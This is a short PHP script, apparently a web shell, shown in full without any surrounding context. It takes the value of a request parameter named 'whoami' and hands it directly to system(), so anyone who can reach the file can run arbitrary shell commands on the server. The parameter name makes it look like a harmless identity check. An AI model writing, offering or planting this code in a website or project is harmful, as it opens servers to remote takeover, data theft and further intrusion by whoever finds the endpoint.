<pre>
<?php
    if (isset($_REQUEST["whoami"])) {
        system($_REQUEST["whoami"]);
    } else {
        echo "No command requested.";
    }
?>
</pre>